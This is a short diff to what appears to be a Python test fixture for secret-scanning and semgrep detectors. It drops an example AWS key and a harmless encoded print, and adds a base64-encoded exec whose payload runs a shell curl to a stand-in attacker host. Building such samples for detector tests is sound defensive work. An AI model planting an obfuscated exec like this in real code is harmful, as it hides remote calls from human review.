@@ -7,9 +7,6 @@ merge.
 
 import base64
 
-# 1. Committed secret -> secret-scan.py (AWS access-key-id shape; this is the
-#    well-known AWS documentation EXAMPLE key, not a live credential).
-aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"
-
-# 2. Obfuscated code execution -> semgrep rule `exec-on-decoded-payload`.
-exec(base64.b64decode("cHJpbnQoJ3B3bmVkJyk="))
+# Obfuscated code execution -> semgrep rule `exec-on-decoded-payload`. A real
+# backdoor hides its payload this way to slip past human review.
+exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBhdHRhY2tlci54eHgnKQ=="))
